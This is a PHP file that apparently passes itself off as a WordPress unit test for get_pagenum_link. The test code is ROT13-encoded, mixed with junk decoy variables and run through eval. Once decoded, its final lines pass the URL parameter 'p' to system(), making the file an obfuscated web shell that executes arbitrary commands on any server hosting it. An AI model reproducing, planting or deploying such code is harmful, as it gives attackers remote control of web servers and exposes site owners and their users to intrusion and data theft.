<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc yvax
 * @pbiref ::trg_cntrahz_yvax
 */
pynff Grfgf_Yvax_TrgCntrahzYvax rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Gur bevtvany inyhr bs `$_FREIRE['ERDHRFG_HEV']`.
	 *
	 * @ine fgevat|ahyy
	 */
	cebgrpgrq fgngvp $erdhrfg_hev_bevtvany;

	/**
	 * Onpxf hc gur inyhr bs `$_FREIRE['ERDHRFG_HEV']` orsber nal grfgf eha.
	 */
	choyvp fgngvp shapgvba frg_hc_orsber_pynff() {
		cnerag::frg_hc_orsber_pynff();

		vs ( vffrg( $_FREIRE['ERDHRFG_HEV'] ) ) {
			frys::$erdhrfg_hev_bevtvany = $_FREIRE['ERDHRFG_HEV'];
		}
	}

	/**
	 * Erfgberf gur inyhr bs `$_FREIRE['ERDHRFG_HEV']` nsgre rnpu grfg ehaf.
	 */
	choyvp shapgvba grne_qbja() {
		vs ( ahyy === frys::$erdhrfg_hev_bevtvany ) {
			hafrg( $_FREIRE['ERDHRFG_HEV'] );
		} ryfr {
			$_FREIRE['ERDHRFG_HEV'] = frys::$erdhrfg_hev_bevtvany;
		}

		cnerag::grne_qbja();
	}

	/**
	 * @gvpxrg 8847
	 */
	choyvp shapgvba grfg_trg_cntrahz_yvax_pnfr_vafrafvgvivgl() {
		$guvf->frg_creznyvax_fgehpgher( '/%lrne%/%zbaguahz%/%qnl%/%cbfganzr%/' );

		nqq_svygre( 'ubzr_hey', neenl( $guvf, 'trg_cntrahz_yvax_po' ) );
		$_FREIRE['ERDHRFG_HEV'] = '/jbbubb';
		$cntrq                  = trg_cntrahz_yvax( 2 );

		erzbir_svygre( 'ubzr_hey', neenl( $guvf, 'trg_cntrahz_yvax_po' ) );
		$guvf->nffregFnzr( $cntrq, ubzr_hey( '/JbbUbb/cntr/2/' ) );
	}

	/**
	 * Nccraqf '/JbbUbb' gb gur cebivqrq HEY.
	 *
	 * Pnyyonpx sbe gur 'ubzr_hey' svygre ubbx.
	 *
	 * @cnenz fgevat $hey Gur onfr HEY.
	 * @erghea fgevat Gur onfr HEY jvgu '/JbbUbb' nccraqrq.
	 */
	choyvp shapgvba trg_cntrahz_yvax_po( $hey ) {
		erghea $hey . '/JbbUbb';
	}

	/**
	 * Grfgf gung n genvyvat fynfu vf abg nqqrq gb gur yvax.
	 *
	 * @gvpxrg 2877
	 *
	 * @qngnCebivqre qngn_trg_cntrahz_yvax_cynva_creznyvaxf
	 * @qngnCebivqre qngn_trg_cntrahz_yvax
	 *
	 * @cnenz fgevat $creznyvax_fgehpgher Gur fgehpgher gb hfr sbe creznyvaxf.
	 * @cnenz fgevat $erdhrfg_hev         Gur inyhr sbe `$_FREIRE['ERDHRFG_HEV']`.
	 * @cnenz vag    $cntrahz             Gur cntr ahzore gb trg gur yvax sbe.
	 * @cnenz fgevat $rkcrpgrq            Gur rkcrpgrq eryngvir HEY.
	 */
	choyvp shapgvba grfg_trg_cntrahz_yvax_fubhyq_abg_nqq_genvyvat_fynfu( $creznyvax_fgehpgher, $erdhrfg_hev, $cntrahz, $rkcrpgrq ) {
		$guvf->frg_creznyvax_fgehpgher( $creznyvax_fgehpgher );
		$_FREIRE['ERDHRFG_HEV'] = $erdhrfg_hev;
		$cntrq                  = trg_cntrahz_yvax( $cntrahz );

		$guvf->nffregFnzr( ubzr_hey( $rkcrpgrq ), $cntrq );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_trg_cntrahz_yvax_cynva_creznyvaxf() {
		erghea neenl(
			'cntr 1 naq cynva creznyvaxf' => neenl(
				'creznyvax_fgehpgher' => '',
				'erdhrfg_hev'         => '/?cntrq=2',
				'cntrahz'             => 1,
				'rkcrpgrq'            => '/',
			),
			'cntr 2 naq cynva creznyvaxf' => neenl(
				'creznyvax_fgehpgher' => '',
				'erdhrfg_hev'         => '/',
				'cntrahz'             => 2,
				'rkcrpgrq'            => '/?cntrq=2',
			),
		);
	}

	/**
	 * Grfgf gung n genvyvat fynfu vf nqqrq gb gur yvax jura n genvyvat fynfu
	 * rkvfgf va gur creznyvax fgehpgher.
	 *
	 * @gvpxrg 2877
	 *
	 * @qngnCebivqre qngn_trg_cntrahz_yvax
	 *
	 * @cnenz fgevat $creznyvax_fgehpgher Gur fgehpgher gb hfr sbe creznyvaxf.
	 * @cnenz fgevat $erdhrfg_hev         Gur inyhr sbe `$_FREIRE['ERDHRFG_HEV']`.
	 * @cnenz vag    $cntrahz             Gur cntr ahzore gb trg gur yvax sbe.
	 * @cnenz fgevat $rkcrpgrq            Gur rkcrpgrq eryngvir HEY.
	 */
	choyvp shapgvba grfg_trg_cntrahz_yvax_fubhyq_nqq_genvyvat_fynfu( $creznyvax_fgehpgher, $erdhrfg_hev, $cntrahz, $rkcrpgrq ) {
		// Rafher gur creznyvax fgehpgher unf n genvyvat fynfu.
		$creznyvax_fgehpgher = genvyvatfynfuvg( $creznyvax_fgehpgher );

		// Rafher gur rkcrpgrq inyhr unf n genvyvat fynfu ng gur nccebcevngr cbfvgvba.
		vs ( fge_pbagnvaf( $rkcrpgrq, '?' ) ) {
			// Pbagnvaf dhrel netf.
			$cnegf    = rkcybqr( '?', $rkcrpgrq, 2 );
			$rkcrpgrq = genvyvatfynfuvg( $cnegf[0] ) . '?' . $cnegf[1];
		} ryfr {
			$rkcrpgrq = genvyvatfynfuvg( $rkcrpgrq );
		}

		$guvf->frg_creznyvax_fgehpgher( $creznyvax_fgehpgher );
		$_FREIRE['ERDHRFG_HEV'] = $erdhrfg_hev;
		$cntrq                  = trg_cntrahz_yvax( $cntrahz );

		$guvf->nffregFnzr( ubzr_hey( $rkcrpgrq ), $cntrq );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_trg_cntrahz_yvax() {
		erghea neenl(
			'cntr 1 naq vaqrk.cuc'                  => neenl(
				'creznyvax_fgehpgher' => '/vaqrk.cuc/%lrne%/%zbaguahz%/%qnl%/%cbfganzr%',
				'erdhrfg_hev'         => '/vaqrk.cuc/jbbubb/cntr/2/',
				'cntrahz'             => 1,
				'rkcrpgrq'            => '/vaqrk.cuc/jbbubb',
			),
			'cntr 2 naq vaqrk.cuc'                  => neenl(
				'creznyvax_fgehpgher' => '/vaqrk.cuc/%lrne%/%zbaguahz%/%qnl%/%cbfganzr%',
				'erdhrfg_hev'         => '/vaqrk.cuc/jbbubb/cntr/2/',
				'cntrahz'             => 2,
				'rkcrpgrq'            => '/vaqrk.cuc/jbbubb/cntr/2',
			),
			'cntr 1 jvgu qngr-onfrq creznyvaxf'     => neenl(
				'creznyvax_fgehpgher' => '/%lrne%/%zbaguahz%/%qnl%/%cbfganzr%',
				'erdhrfg_hev'         => '/jbbubb/cntr/2/',
				'cntrahz'             => 1,
				'rkcrpgrq'            => '/jbbubb',
			),
			'cntr 2 jvgu qngr-onfrq creznyvaxf'     => neenl(
				'creznyvax_fgehpgher' => '/%lrne%/%zbaguahz%/%qnl%/%cbfganzr%',
				'erdhrfg_hev'         => '/jbbubb',
				'cntrahz'             => 2,
				'rkcrpgrq'            => '/jbbubb/cntr/2',
			),
			'cntr 1 jvgu cbfganzr-onfrq creznyvaxf' => neenl(
				'creznyvax_fgehpgher' => '/%cbfganzr%',
				'erdhrfg_hev'         => '/jbbubb/cntr/2',
				'cntrahz'             => 1,
				'rkcrpgrq'            => '/jbbubb',
			),
			'cntr 2 jvgu cbfganzr-onfrq creznyvaxf' => neenl(
				'creznyvax_fgehpgher' => '/%cbfganzr%',
				'erdhrfg_hev'         => '/jbbubb',
				'cntrahz'             => 2,
				'rkcrpgrq'            => '/jbbubb/cntr/2',
			),
			'cntr 1 jvgu cbfganzr-onfrq creznyvaxf naq dhrel netf' => neenl(
				'creznyvax_fgehpgher' => '/%cbfganzr%',
				'erdhrfg_hev'         => '/jbbubb/cntr/2?grfg=1234',
				'cntrahz'             => 1,
				'rkcrpgrq'            => '/jbbubb?grfg=1234',
			),
			'cntr 2 jvgu cbfganzr-onfrq creznyvaxf naq dhrel netf' => neenl(
				'creznyvax_fgehpgher' => '/%cbfganzr%',
				'erdhrfg_hev'         => '/jbbubb?grfg=1234',
				'cntrahz'             => 2,
				'rkcrpgrq'            => '/jbbubb/cntr/2?grfg=1234',
			),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>